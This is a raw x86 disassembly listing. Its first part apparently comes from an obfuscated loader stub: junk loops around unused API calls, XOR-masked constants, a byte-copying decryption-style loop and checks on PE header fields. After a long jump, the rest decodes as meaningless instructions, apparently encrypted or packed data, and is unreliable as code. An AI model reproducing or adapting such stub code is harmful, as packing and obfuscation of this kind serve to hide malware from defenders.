  423df3:	sub    esp,0x10
  423df6:	mov    eax,0xf89c85a5
  423dfb:	mov    DWORD PTR ds:0x42b222,0x14
  423e05:	cmp    DWORD PTR ds:0x42b222,0x0
  423e0c:	je     0x423e66
  423e12:	cmp    DWORD PTR ds:0x42b222,0x9
  423e19:	jbe    0x423e66
  423e1f:	jmp    0x423e38
  423e24:	push   0x42a03d
  423e29:	push   0x1
  423e2b:	push   0x1
  423e2d:	push   0x14be
  423e32:	call   DWORD PTR ds:0x42b2ee
  423e38:	cmp    DWORD PTR ds:0x42b222,0xa
  423e3f:	jne    0x423e54
  423e45:	xor    edx,edx
  423e47:	add    edx,DWORD PTR ds:0x42b222
  423e4d:	dec    edx
  423e4e:	mov    DWORD PTR ds:0x42b222,edx
  423e54:	mov    edx,DWORD PTR ds:0x42b222
  423e5a:	dec    edx
  423e5b:	mov    DWORD PTR ds:0x42b222,edx
  423e61:	jmp    0x423e05
  423e66:	mov    DWORD PTR [ebp-0x4],eax
  423e69:	and    DWORD PTR ds:0x42b1fa,0x0
  423e73:	jmp    0x423e85
  423e78:	mov    edx,DWORD PTR ds:0x42b1fa
  423e7e:	inc    edx
  423e7f:	mov    DWORD PTR ds:0x42b1fa,edx
  423e85:	cmp    DWORD PTR ds:0x42b1fa,0x19
  423e8c:	jae    0x423ece
  423e92:	cmp    DWORD PTR ds:0x42b1fa,0xc
  423e99:	jg     0x423ece
  423e9f:	jmp    0x423eaf
  423ea4:	push   0x863f
  423ea9:	call   DWORD PTR ds:0x42b2f2
  423eaf:	cmp    DWORD PTR ds:0x42b1fa,0xb
  423eb6:	jne    0x423ec9
  423ebc:	mov    edx,DWORD PTR ds:0x42b1fa
  423ec2:	inc    edx
  423ec3:	mov    DWORD PTR ds:0x42b1fa,edx
  423ec9:	jmp    0x423e78
  423ece:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  423ed5:	mov    edx,DWORD PTR ds:0x42b1aa
  423edb:	or     edx,DWORD PTR ds:0x42b1da
  423ee1:	mov    DWORD PTR ds:0x42b1aa,edx
  423ee7:	mov    ecx,DWORD PTR [ebp-0x4]
  423eea:	not    edx
  423eec:	push   esi
  423eed:	and    edx,esi
  423eef:	mov    edx,0x75108ae
  423ef4:	xor    ecx,edx
  423ef6:	adc    DWORD PTR ds:0x42b18e,ebx
  423efc:	mov    esi,0x3272f5
  423f01:	and    DWORD PTR ds:0x42b186,0x14f5
  423f0b:	push   edi
  423f0c:	adc    edi,DWORD PTR ds:0x42b1c2
  423f12:	mov    edi,DWORD PTR [ebp+0x10]
  423f15:	xor    DWORD PTR ds:0x42b1fa,0x42b1ce
  423f1f:	add    ecx,esi
  423f21:	mov    DWORD PTR ds:0x42b1da,0x1b10
  423f2b:	cmp    ecx,edi
  423f2d:	mov    DWORD PTR ds:0x42b1d6,0x199
  423f37:	je     0x42401c
  423f3d:	xor    edi,ecx
  423f3f:	mov    ecx,DWORD PTR [ebp-0x4]
  423f42:	sbb    DWORD PTR ds:0x42b202,0x792c
  423f4c:	mov    edi,DWORD PTR [ebp+0x10]
  423f4f:	sub    DWORD PTR ds:0x42b1ba,0xd36
  423f59:	xor    eax,eax
  423f5b:	xor    ecx,edx
  423f5d:	xor    DWORD PTR ds:0x42b216,0x49be
  423f67:	add    ecx,esi
  423f69:	add    edi,0xfabdbed4
  423f6f:	adc    eax,0xffffffff
  423f72:	xor    eax,0x0
  423f75:	mov    DWORD PTR [ebp-0xc],eax
  423f78:	push   ebx
  423f79:	xor    ebx,ebx
  423f7b:	xor    edi,0x8a29a141
  423f81:	mov    eax,ecx
  423f83:	add    eax,0xfabdbed4
  423f88:	adc    ebx,0xffffffff
  423f8b:	xor    eax,0x8a29a141
  423f90:	xor    ebx,0x0
  423f93:	cmp    eax,edi
  423f95:	jne    0x423fae
  423f9b:	cmp    ebx,DWORD PTR [ebp-0xc]
  423f9e:	je     0x424016
  423fa4:	jmp    0x423fae
  423fa9:	mov    esi,0x3272f5
  423fae:	mov    eax,DWORD PTR [ebp-0x4]
  423fb1:	mov    edi,DWORD PTR [ebp-0x8]
  423fb4:	xor    edi,edx
  423fb6:	add    edi,esi
  423fb8:	mov    esi,DWORD PTR [ebp+0x8]
  423fbb:	imul   edi,ecx
  423fbe:	mov    ebx,DWORD PTR [ebp+0xc]
  423fc1:	xor    eax,edx
  423fc3:	add    eax,ecx
  423fc5:	mov    al,BYTE PTR [ebx+eax*1+0x3272f5]
  423fcc:	mov    BYTE PTR [edi+esi*1],al
  423fcf:	mov    eax,DWORD PTR [ebp-0x8]
  423fd2:	mov    esi,DWORD PTR [ebp+0x10]
  423fd5:	xor    eax,edx
  423fd7:	xor    ebx,ebx
  423fd9:	add    esi,0xfabdbed4
  423fdf:	adc    ebx,0xffffffff
  423fe2:	lea    ecx,[ecx+eax*1+0x3272f5]
  423fe9:	xor    edi,edi
  423feb:	xor    esi,0x8a29a141
  423ff1:	xor    ebx,0x0
  423ff4:	mov    eax,ecx
  423ff6:	add    eax,0xfabdbed4
  423ffb:	adc    edi,0xffffffff
  423ffe:	xor    eax,0x8a29a141
  424003:	xor    edi,0x0
  424006:	cmp    eax,esi
  424008:	jne    0x423fa9
  42400e:	cmp    edi,ebx
  424010:	jne    0x423fa9
  424016:	mov    eax,0xf89c85a2
  42401b:	pop    ebx
  42401c:	pop    edi
  42401d:	pop    esi
  42401e:	leave  
  42401f:	ret    0xc
  424022:	push   ebp
  424023:	mov    ebp,esp
  424025:	push   ecx
  424026:	and    DWORD PTR ds:0x42b19e,0x0
  424030:	jmp    0x424043
  424035:	xor    eax,eax
  424037:	xor    eax,DWORD PTR ds:0x42b19e
  42403d:	inc    eax
  42403e:	mov    ds:0x42b19e,eax
  424043:	cmp    DWORD PTR ds:0x42b19e,0x14
  42404a:	jae    0x424072
  424050:	cmp    DWORD PTR ds:0x42b19e,0x1e
  424057:	jg     0x424072
  42405d:	jmp    0x42406d
  424062:	push   0x42b182
  424067:	call   DWORD PTR ds:0x42b2f6
  42406d:	jmp    0x424035
  424072:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  424079:	and    DWORD PTR ds:0x42b1b2,0x0
  424083:	xor    ecx,ecx
  424085:	xor    ecx,DWORD PTR ds:0x42b1b2
  42408b:	inc    ecx
  42408c:	mov    DWORD PTR ds:0x42b1b2,ecx
  424092:	cmp    DWORD PTR ds:0x42b1b2,0x4
  424099:	jle    0x4240e5
  42409f:	jmp    0x4240be
  4240a4:	push   0x42b206
  4240a9:	push   0x42b1c6
  4240ae:	push   0x6e36
  4240b3:	push   0x42a0fe
  4240b8:	call   DWORD PTR ds:0x42b2fa
  4240be:	cmp    DWORD PTR ds:0x42b1b2,0x3
  4240c5:	jne    0x4240d8
  4240cb:	mov    ecx,DWORD PTR ds:0x42b1b2
  4240d1:	inc    ecx
  4240d2:	mov    DWORD PTR ds:0x42b1b2,ecx
  4240d8:	cmp    DWORD PTR ds:0x42b1b2,0x1b
  4240df:	jb     0x424083
  4240e5:	mov    eax,DWORD PTR [ebp+0x8]
  4240e8:	movsx  eax,BYTE PTR [eax]
  4240eb:	mov    edx,0x3272f5
  4240f0:	sub    eax,edx
  4240f2:	mov    ecx,0x75108ae
  4240f7:	xor    eax,ecx
  4240f9:	cmp    eax,0xf89c85f6
  4240fe:	jne    0x42412d
  424104:	mov    eax,DWORD PTR [ebp+0x8]
  424107:	push   esi
  424108:	mov    esi,DWORD PTR [ebp+0x8]
  42410b:	add    esi,DWORD PTR [eax+0x3c]
  42410e:	mov    DWORD PTR [ebp+0x8],esi
  424111:	mov    eax,DWORD PTR [ebp-0x4]
  424114:	mov    esi,DWORD PTR [ebp+0x8]
  424117:	xor    eax,ecx
  424119:	add    eax,edx
  42411b:	cmp    DWORD PTR [esi+0x54],eax
  42411e:	pop    esi
  42411f:	je     0x42412d
  424125:	mov    eax,DWORD PTR [ebp+0x8]
  424128:	jmp    0x424134
  42412d:	mov    eax,DWORD PTR [ebp-0x4]
  424130:	xor    eax,ecx
  424132:	add    eax,edx
  424134:	leave  
  424135:	ret    0x4
  424138:	push   ebp
  424139:	mov    ebp,esp
  42413b:	sub    esp,0xc
  42413e:	and    DWORD PTR ds:0x42b1c6,0x0
  424148:	jmp    0x42415a
  42414d:	mov    edx,DWORD PTR ds:0x42b1c6
  424153:	inc    edx
  424154:	mov    DWORD PTR ds:0x42b1c6,edx
  42415a:	cmp    DWORD PTR ds:0x42b1c6,0x1b
  424161:	jae    0x4241a8
  424167:	cmp    DWORD PTR ds:0x42b1c6,0xd
  42416e:	jle    0x4241a8
  424174:	jmp    0x424189
  424179:	push   0x42b216
  42417e:	push   0x42a1f3
  424183:	call   DWORD PTR ds:0x42b2fe
  424189:	cmp    DWORD PTR ds:0x42b1c6,0xc
  424190:	jne    0x4241a3
  424196:	mov    edx,DWORD PTR ds:0x42b1c6
  42419c:	inc    edx
  42419d:	mov    DWORD PTR ds:0x42b1c6,edx
  4241a3:	jmp    0x42414d
  4241a8:	push   esi
  4241a9:	and    DWORD PTR ds:0x42b222,0x0
  4241b3:	xor    esi,esi
  4241b5:	or     esi,DWORD PTR ds:0x42b222
  4241bb:	inc    esi
  4241bc:	mov    DWORD PTR ds:0x42b222,esi
  4241c2:	cmp    DWORD PTR ds:0x42b222,0x7
  4241c9:	jl     0x424211
  4241cf:	jmp    0x4241ea
  4241d4:	push   DWORD PTR [ebp-0x28]
  4241d7:	push   DWORD PTR [ebp-0x24]
  4241da:	push   0x42a1b7
  4241df:	push   0x400000
  4241e4:	call   DWORD PTR ds:0x42b306
  4241ea:	cmp    DWORD PTR ds:0x42b222,0x6
  4241f1:	jne    0x424204
  4241f7:	mov    esi,DWORD PTR ds:0x42b222
  4241fd:	inc    esi
  4241fe:	mov    DWORD PTR ds:0x42b222,esi
  424204:	cmp    DWORD PTR ds:0x42b222,0x15
  42420b:	jb     0x4241b3
  424211:	mov    esi,0xf89c85a5
  424216:	or     DWORD PTR ds:0x42b1d6,0x459e
  424220:	mov    DWORD PTR [ebp-0x8],esi
  424223:	and    DWORD PTR ds:0x42b1d6,0x0
  42422d:	jmp    0x424241
  424232:	xor    ecx,ecx
  424234:	xor    ecx,DWORD PTR ds:0x42b1d6
  42423a:	inc    ecx
  42423b:	mov    DWORD PTR ds:0x42b1d6,ecx
  424241:	cmp    DWORD PTR ds:0x42b1d6,0x1c
  424248:	jae    0x42428f
  42424e:	cmp    DWORD PTR ds:0x42b1d6,0xf
  424255:	jge    0x42428f
  42425b:	jmp    0x424270
  424260:	push   0x42a1a1
  424265:	push   0x0
  424267:	push   DWORD PTR [ebp-0x20]
  42426a:	call   DWORD PTR ds:0x42b30e
  424270:	cmp    DWORD PTR ds:0x42b1d6,0xe
  424277:	jne    0x42428a
  42427d:	mov    ecx,DWORD PTR ds:0x42b1d6
  424283:	inc    ecx
  424284:	mov    DWORD PTR ds:0x42b1d6,ecx
  42428a:	jmp    0x424232
  42428f:	mov    DWORD PTR [ebp-0x4],0xf89c85a2
  424296:	push   edi
  424297:	mov    eax,eax
  424299:	mov    eax,DWORD PTR [ebp-0x4]
  42429c:	mov    edi,DWORD PTR [ebp-0x8]
  42429f:	mov    ecx,0x75108ae
  4242a4:	xor    eax,ecx
  4242a6:	xor    edi,ecx
  4242a8:	mov    edx,0x3272f5
  4242ad:	add    edi,edx
  4242af:	add    eax,edx
  4242b1:	imul   eax,edi
  4242b4:	mov    edi,DWORD PTR [ebp+0xc]
  4242b7:	jmp    0x4257d7
  4242bc:	jge    0x42427f
  4242be:	jnp    0x42427a
  4242c0:	mov    bh,0xb2
  4242c2:	mov    dl,0xbe
  4242c4:	jmp    0x1e2776ec
  4242c9:	sub    ebx,ecx
  4242cb:	add    dl,BYTE PTR [edx+0x7e838095]
  4242d1:	ins    BYTE PTR es:[edi],dx
  4242d2:	add    DWORD PTR [ebx-0x92628f4],0xfffffffb
  4242d9:	cmp    eax,0x55d7fc72
  4242de:	icebp  
  4242df:	(bad)
  4242e3:	xor    eax,DWORD PTR [eax]
  4242e5:	fwait
  4242e6:	call   0xcc43880a
  4242eb:	mov    ds:0x3459daf5,eax
  4242f0:	push   0x1a
  4242f2:	aad    0x9e
  4242f4:	inc    ecx
  4242f5:	je     0x42433d
  4242f7:	nop
  4242f8:	(bad)  
  4242f9:	xchg   ecx,eax
  4242fa:	jmp    0x51f0:0x104a1d4b
  424301:	ficomp DWORD PTR [edx]
  424303:	push   ecx
  424304:	fimul  WORD PTR [esi]
  424306:	jb     0x42429f
  424308:	inc    eax
  424309:	jp     0x424350
  42430b:	fimul  WORD PTR [ebx]
  42430d:	jp     0x4242db
  42430f:	les    edi,FWORD PTR [ebp-0x29899b38]
  424315:	xor    ebx,DWORD PTR [edx]
  424317:	xor    al,0x6
  424319:	js     0x424373
  42431b:	mov    ds:0xf728accc,eax
  424320:	mov    ch,0xc8
  424322:	repnz push ebx
  424324:	mov    dl,0x7c
  424326:	call   0x7f01bfb
  42432b:	dec    esp
  42432c:	jnp    0x424367
  42432e:	mov    BYTE PTR [ebp+0x7c66071e],bh
  424334:	in     eax,0xe1
  424336:	icebp  
  424337:	xchg   edi,eax
  424338:	stos   DWORD PTR es:[edi],eax
  424339:	ror    DWORD PTR [eax+0xb],0xe2
  42433d:	mov    es,ebp
  42433f:	xchg   edi,eax
  424340:	rcl    BYTE PTR [ecx+0x1bc72804],cl
  424346:	enter  0x2f85,0xc4
  42434a:	sub    al,0x50
  42434c:	mov    BYTE PTR [eax+0x6310f80e],dl
  424352:	mov    eax,ds:0xe5dbbaa4
  424357:	push   ebx
  424358:	cdq    
  424359:	into   
  42435a:	add    bl,bl
  42435c:	sahf   
  42435d:	jle    0x4243d8
  42435f:	mov    ebx,0x9ddb0b83
  424364:	pop    eax
  424365:	push   cs
  424366:	jge    0x4243b8
  424368:	leave  
  424369:	dec    ebp
  42436a:	call   0x318c:0xfe6acc22
  424371:	mov    cl,0x3f
  424373:	lds    ebp,FWORD PTR [esp+esi*4+0x462df28e]
  42437a:	xchg   esp,eax
  42437b:	test   al,0xec
  42437d:	out    0x55,al
  42437f:	out    0x99,al
  424381:	test   DWORD PTR [ebx+0x18c3cd5f],0xc1bf6d91
  42438b:	jbe    0x4243eb
  42438d:	cmp    al,0x52
  42438f:	dec    edi
  424390:	(bad)  
  424391:	pop    ebx
  424392:	es push edi
  424394:	pop    ds
  424395:	pop    esi
  424396:	xchg   esp,eax
  424397:	ins    DWORD PTR es:[edi],dx
  424398:	fldcw  WORD PTR [edx-0x1681d03f]
  42439e:	mov    dl,0x5c
  4243a0:	icebp  
  4243a1:	pop    ecx
  4243a2:	loopne 0x424329
  4243a4:	addr16 push esp
  4243a6:	cwde   
  4243a7:	xlat   BYTE PTR ds:[ebx]
  4243a8:	inc    BYTE PTR [ecx]
  4243aa:	xor    al,0x8d
  4243ac:	jmp    0xcb21f39b
  4243b1:	xlat   BYTE PTR ds:[ebx]
  4243b2:	mov    esp,0x3ebfd18
  4243b7:	ret    0xe346
  4243ba:	shl    al,0x6b
  4243bd:	xchg   DWORD PTR [edx],ebp
  4243bf:	shr    BYTE PTR [eax-0xde110d5],0xce
  4243c6:	ja     0x424390
  4243c8:	jb     0x424401
  4243ca:	out    dx,eax
  4243cb:	xchg   ecx,eax
  4243cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243cd:	sub    ch,BYTE PTR [ebx+0x371ad4dc]
  4243d3:	mov    dl,0x2a
  4243d5:	add    al,0xa3
  4243d7:	test   al,0xd1
  4243d9:	cmp    BYTE PTR [ecx+edx*4],0x17
  4243dd:	xchg   ecx,eax
  4243de:	mov    ch,0x34
  4243e0:	push   ebx
  4243e1:	add    ch,BYTE PTR [ebp*2+0x12c35a7f]
  4243e8:	cdq    
  4243e9:	fadd   st(0),st
  4243eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243ec:	dec    edx
  4243ed:	fwait
  4243ee:	push   es
  4243ef:	jp     0x4243af
  4243f1:	jns    0x4243e4
  4243f3:	jb     0x424403
  4243f5:	lock xor eax,0x41d270d6
  4243fb:	ret    0x2914
  4243fe:	nop
  4243ff:	(bad)  
  424400:	jb     0x4243ca
  424402:	lods   eax,DWORD PTR ds:[esi]
  424403:	pop    es
  424404:	jns    0x424422
  424406:	mov    bl,0x42
  424408:	inc    edx
  424409:	and    al,0xad
  42440b:	push   ebp
  42440c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42440d:	outs   dx,DWORD PTR ds:[esi]
  42440e:	ins    DWORD PTR es:[edi],dx
  42440f:	xchg   ebx,eax
  424410:	leave  
  424411:	adc    al,0xf0
  424413:	and    al,0xfa
  424415:	nop
  424416:	or     DWORD PTR [ecx-0x1881df75],esp
  42441c:	loope  0x42444a
  42441e:	jno    0x424458
  424420:	push   esp
  424421:	(bad)  
  424422:	sbb    eax,DWORD PTR [edx+0x78]
  424425:	int    0x79
  424427:	aam    0xd0
  424429:	and    eax,0x3e7eb00f
  42442e:	pop    ds
  42442f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424430:	sub    al,0xda
  424432:	xchg   edx,eax
  424433:	mov    gs,WORD PTR es:[ebx]
  424436:	mov    edi,0xff1ecfba
  42443b:	lods   eax,DWORD PTR ds:[esi]
  42443c:	add    bl,ah
  42443e:	mov    ch,0x90
  424440:	jbe    0x4243fc
  424442:	test   DWORD PTR [edi-0x3],edx
  424445:	aas    
  424446:	retf   0x1bb7
  424449:	dec    ebp
  42444a:	scas   al,BYTE PTR es:[edi]
  42444b:	stos   DWORD PTR es:[edi],eax
  42444c:	enter  0xb61a,0xee
  424450:	test   eax,0x11b679c4
  424455:	fdiv   st(2),st
  424457:	iret   
  424458:	lds    esi,FWORD PTR [edi+ecx*1-0x48]
  42445c:	inc    ecx
  42445d:	push   edi
  42445e:	into   
  42445f:	jmp    0x4acd3124
  424464:	push   ss
  424465:	ins    BYTE PTR es:[edi],dx
  424466:	sub    DWORD PTR [ebx-0x4f9f06b9],edi
  42446c:	ja     0x4244b0
  42446e:	bound  esi,QWORD PTR [ecx-0x22686c6c]
  424474:	xchg   ebx,eax
  424475:	fcomp  QWORD PTR [ebp+esi*2+0x4e29db5b]
  42447c:	and    esi,DWORD PTR [eax+0x3e3fd882]
  424482:	adc    ecx,DWORD PTR [edx]
  424484:	mov    eax,0x5dba1560
  424489:	push   eax
  42448a:	mov    ch,0x40
  42448c:	popa   
  42448d:	ja     0x424412
  42448f:	idiv   DWORD PTR [ebx-0x2b]
  424492:	sbb    ah,0x96
  424495:	adc    BYTE PTR [ebx],0xd6
  424498:	mov    WORD PTR [edi-0x6e],gs
  42449b:	xlat   BYTE PTR ds:[ebx]
  42449c:	mov    ah,BYTE PTR [eax-0x7e]
  42449f:	inc    esp
  4244a0:	rcl    DWORD PTR [edx+0x79],cl
  4244a3:	jmp    0x51fe:0x537dcf90
  4244aa:	add    al,0xa2
  4244ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244ad:	cs mov dh,0xd4
  4244b0:	aad    0x66
  4244b2:	inc    esi
  4244b3:	les    ebp,FWORD PTR [ecx]
  4244b5:	sub    dh,cl
  4244b7:	inc    ecx
  4244b8:	shl    BYTE PTR [eax+edi*1],cl
  4244bb:	in     al,dx
  4244bc:	sbb    al,0xb9
  4244be:	lahf   
  4244bf:	push   ds
  4244c0:	mov    ecx,0x14f8e24b
  4244c5:	fsub   QWORD PTR [ecx]
  4244c7:	hlt    
  4244c8:	inc    ebx
  4244c9:	ss ds sti 
  4244cc:	retf   0x4f8d
  4244cf:	dec    esp
  4244d0:	adc    eax,0x41ef8eff
  4244d5:	push   0x644d6a82
  4244da:	cmp    BYTE PTR [ebx+0x6b232f38],dh
  4244e0:	es push ecx
  4244e2:	ret    
  4244e3:	mov    eax,ds:0xd5bf51a
  4244e8:	xchg   esp,eax
  4244e9:	test   DWORD PTR [ebx],edx
  4244eb:	and    BYTE PTR [edi+ecx*2],dh
  4244ee:	inc    esp
  4244ef:	and    BYTE PTR [ecx+0x77],dl
  4244f2:	mov    ds:0xdb996391,al
  4244f7:	lods   al,BYTE PTR ds:[esi]
  4244f8:	fadd   QWORD PTR [edi-0x4]
  4244fb:	lock adc al,0x1a
  4244fe:	and    eax,0x1a54b2d9
  424503:	adc    dl,bl
  424505:	push   ds
  424506:	data16 test BYTE PTR [ebx],0x55
  42450a:	mov    edx,0x3a4c574
  42450f:	mov    DWORD PTR [edi-0x42d378e8],ecx
  424515:	mov    eax,0x1634907d
  42451a:	in     eax,0x49
  42451c:	adc    DWORD PTR [edx],0xefca5e7c
  424522:	cs inc esp
  424524:	retf   
  424525:	ins    BYTE PTR es:[edi],dx
  424526:	mov    BYTE PTR [esi+0x1347926c],dh
  42452c:	gs inc ebp
  42452e:	inc    eax
  42452f:	lock push ecx
  424531:	ror    BYTE PTR [eax+0x22],1
  424534:	(bad)  
  424536:	jae    0x4244c5
  424538:	push   0x4d
  42453a:	stos   DWORD PTR es:[edi],eax
  42453b:	mov    ecx,eax
  42453d:	mov    dl,0x5a
  42453f:	in     al,0xce
  424541:	enter  0x2dbe,0xf
  424545:	rcl    BYTE PTR [ebx],0x68
  424548:	adc    BYTE PTR ds:0x86452ee1,0xb0
  42454f:	cmp    al,0x19
  424551:	shl    DWORD PTR [eax-0x4],cl
  424554:	push   ecx
  424555:	sub    ch,bl
  424557:	push   ebp
  424558:	aas    
  424559:	cmp    al,0x56
  42455b:	scas   al,BYTE PTR es:[edi]
  42455c:	aas    
  42455d:	push   esi
  42455e:	add    eax,0xe14d9d4e
  424563:	or     esp,DWORD PTR ds:0x5502ef7f
  424569:	sub    eax,0x93a25850
  42456e:	pusha  
  42456f:	popf   
  424570:	es (bad) 
  424573:	in     al,dx
  424574:	pop    ebp
  424575:	and    esp,DWORD PTR es:[esi-0x4038b5a1]
  42457c:	fs jnp 0x42458d
  42457f:	lahf   
  424580:	aam    0xe2
  424582:	cdq    
  424583:	data16 aam 0xd1
  424586:	mov    BYTE PTR [eax],ch
  424588:	xor    eax,0xff26d6ce
  42458d:	nop    ecx
  424590:	cmp    eax,0x2a9c1ee6
  424595:	pop    ss
  424596:	ins    DWORD PTR es:[edi],dx
  424597:	push   esi
  424598:	jnp    0x4245eb
  42459a:	xchg   esi,ebx
  42459c:	and    al,BYTE PTR ds:0xf1f7a2a9
  4245a2:	adc    dl,BYTE PTR [esi+0x4a0f9e09]
  4245a8:	push   ebx
  4245a9:	mov    bl,BYTE PTR [esi+0x61f04e5]
  4245af:	push   esi
  4245b0:	sbb    ecx,ebp
  4245b2:	add    al,0xf4
  4245b4:	xlat   BYTE PTR ds:[ebx]
  4245b5:	retf   0x9962
  4245b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245b9:	fst    QWORD PTR [esi+ebx*4]
  4245bc:	fadd   QWORD PTR [eax+ebp*8]
  4245bf:	aaa    
  4245c0:	aaa    
  4245c1:	into   
  4245c2:	mov    ds:0x1a793756,al
  4245c7:	ror    DWORD PTR [esi+0x6cb13c69],cl
  4245cd:	push   eax
  4245ce:	mov    eax,0x47fe0189
  4245d3:	ret    0x9884
  4245d6:	push   edi
  4245d7:	mov    ecx,0xa9221b3c
  4245dc:	aam    0x60
  4245de:	adc    ebp,DWORD PTR [ecx]
  4245e0:	add    bh,0x7a
  4245e3:	push   edx
  4245e4:	dec    ebp
  4245e5:	xor    DWORD PTR [ebx-0x2e],ebx
  4245e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245e9:	xor    BYTE PTR [esi],ah
  4245eb:	out    0x9f,al
  4245ed:	mov    esp,0xc1cd5591
  4245f2:	repz in al,0x1f
  4245f5:	jp     0x4245f6
  4245f7:	or     al,0x88
  4245f9:	sub    dh,BYTE PTR [edi+0x90a964d]
  4245ff:	mov    esp,0x3219fba1
  424604:	dec    edi
  424605:	and    bl,0x3
  424608:	dec    eax
  424609:	pop    ecx
  42460a:	cmp    BYTE PTR [eax-0x60eb4d1c],0x47
  424611:	xchg   ebp,eax
  424612:	sbb    ah,BYTE PTR [eax]
  424614:	or     BYTE PTR [edx+0x331ec0b7],bl
  42461a:	or     ecx,DWORD PTR [edi-0x4e]
  42461d:	fs adc eax,0x11a1c88c
  424623:	inc    esi
  424624:	xchg   ecx,eax
  424625:	xchg   ebp,eax
  424626:	and    eax,0xc9cee81b
  42462b:	xchg   DWORD PTR [esi],eax
  42462d:	ror    BYTE PTR [eax],1
  42462f:	pop    ds
  424630:	cmp    BYTE PTR [edi],al
  424632:	ror    DWORD PTR [esi],cl
  424634:	cli    
  424635:	fcmovnb st,st(0)
  424637:	inc    ebx
  424638:	jae    0x424674
  42463a:	fmul   QWORD PTR [edx-0x1acb17dc]
  424640:	or     DWORD PTR [edx-0x3dc910c6],ecx
  424646:	sbb    ebp,DWORD PTR [edi-0x34c86bbb]
  42464c:	dec    edx
  42464d:	(bad)  
  42464e:	xlat   BYTE PTR ds:[ebx]
  42464f:	mov    al,0x8a
  424651:	push   0xffffff8b
  424653:	retf   0x2222
  424656:	fsubr  st(3),st
  424658:	imul   esp,DWORD PTR [ecx],0x2f
  42465b:	(bad)  
  42465d:	add    BYTE PTR [edi],bl
  42465f:	mov    bl,0x0
  424661:	jcxz   0x42460c
  424664:	je     0x4245f7
  424666:	repnz dec eax
  424668:	add    bh,bl
  42466a:	xchg   esi,eax
  42466b:	or     DWORD PTR [ebp-0xe],ecx
  42466e:	jl     0x424659
  424670:	push   edx
  424671:	call   0xa8bc9b5c
  424676:	je     0x424676
  424678:	dec    edx
  424679:	pop    ds
  42467a:	jecxz  0x424655
  42467c:	popa   
  42467d:	pop    edx
  42467e:	retf   0xd1a9
  424681:	or     edx,DWORD PTR [eax+0x608750b]
  424687:	dec    esi
  424688:	int3   
  424689:	add    BYTE PTR [ecx],bh
  42468b:	add    BYTE PTR [eax+0x43],ch
  42468e:	mov    al,0xe8
  424690:	mov    dh,0x8d
  424692:	(bad)  
  424693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424694:	push   ecx
  424695:	inc    ebp
  424696:	lods   eax,DWORD PTR ds:[esi]
  424697:	pop    ss
  424698:	or     dl,BYTE PTR [ecx-0x58ed9d84]
  42469e:	ins    BYTE PTR es:[edi],dx
  42469f:	pop    ebx
  4246a0:	out    0x3f,al
  4246a2:	adc    BYTE PTR [ecx+ebx*8],bh
  4246a5:	add    eax,0x8fd1f7d2
  4246aa:	ins    BYTE PTR es:[edi],dx
  4246ab:	enter  0xc45f,0x1a
  4246af:	in     eax,0x67
  4246b1:	fbstp  TBYTE PTR [edi+ecx*4]
  4246b4:	ins    DWORD PTR es:[edi],dx
  4246b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4246b6:	lock mov BYTE PTR [esi+ebx*8],cl
  4246ba:	sahf   
  4246bb:	mov    ?,WORD PTR [ebx+0x5c]
  4246be:	repnz sub BYTE PTR [eax],bh
  4246c1:	xchg   edi,eax
  4246c2:	(bad)  
  4246c4:	ds loopne 0x4246d3
  4246c7:	mov    edi,DWORD PTR ds:0x87bef43e
  4246cd:	loope  0x42468c
  4246cf:	or     BYTE PTR [eax-0x32],0xd0
  4246d3:	in     eax,0x12
  4246d5:	cli    
  4246d6:	cdq    
  4246d7:	inc    ebx
  4246d8:	fld    QWORD PTR [eax]
  4246da:	loope  0x4246b6
  4246dc:	test   eax,0x36568558
  4246e1:	push   0xd61680b
  4246e6:	jbe    0x4246a1
  4246e8:	test   eax,0x158c5c93
  4246ed:	lock push ebp
  4246ef:	neg    BYTE PTR [ebx-0x4c50a786]
  4246f5:	inc    esi
  4246f6:	call   0xb9e8313c
  4246fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246fc:	pop    ebp
  4246fd:	loope  0x4246be
  4246ff:	jg     0x4246de
  424701:	push   es
  424702:	lods   al,BYTE PTR ds:[esi]
  424703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424704:	push   esi
  424705:	arpl   WORD PTR [ecx+0x25d0b161],si
  42470b:	ret    0x9dae
  42470e:	in     eax,0x8e
  424710:	or     eax,0x7a07c667
  424715:	mov    edx,0x5466048a
  42471a:	xor    eax,0x7268a6f0
  42471f:	mov    edx,DWORD PTR [esi]
  424721:	pop    eax
  424722:	test   al,0x3f
  424724:	repz cli 
  424726:	jnp    0x4246ec
  424728:	sahf   
  424729:	sbb    eax,0x7c2b5d91
  42472e:	std    
  42472f:	pop    eax
  424730:	bound  eax,QWORD PTR [eax-0x50aa3464]
  424736:	shl    DWORD PTR [eax+0x2e],1
  424739:	inc    esi
  42473a:	call   0x72cb0e92
  42473f:	jg     0x424717
  424741:	sahf   
  424742:	jnp    0x424719
  424744:	sbb    al,0x86
  424746:	ins    BYTE PTR es:[edi],dx
  424747:	mov    edx,0x7a54791f
  42474c:	mov    esi,0xff85b5d0
  424751:	lahf   
  424752:	lock and cl,BYTE PTR [esp+eiz*2-0x854f7a8]
  42475a:	xlat   BYTE PTR ds:[ebx]
  42475b:	jnp    0x4247c9
  42475d:	repz mov ds:0x71e90027,al
  424763:	and    al,0x4f
  424765:	mov    ecx,0xb6a41f5
  42476a:	mov    bh,0x17
  42476c:	icebp  
  42476d:	adc    eax,0xf1872d9e
  424772:	int    0xba
  424774:	movlps xmm3,QWORD PTR [ebp-0x7]
  424778:	xor    eax,0x2593427e
  42477d:	cmp    BYTE PTR [ebp+0x62],ch
  424780:	test   eax,0xf2ac5e6c
  424785:	and    ebp,eax
  424787:	cdq    
  424788:	push   esp
  424789:	jno    0x4247e8
  42478b:	in     eax,0xfe
  42478d:	shr    BYTE PTR [edi-0x1af2644f],cl
  424793:	push   ds
  424794:	pop    edx
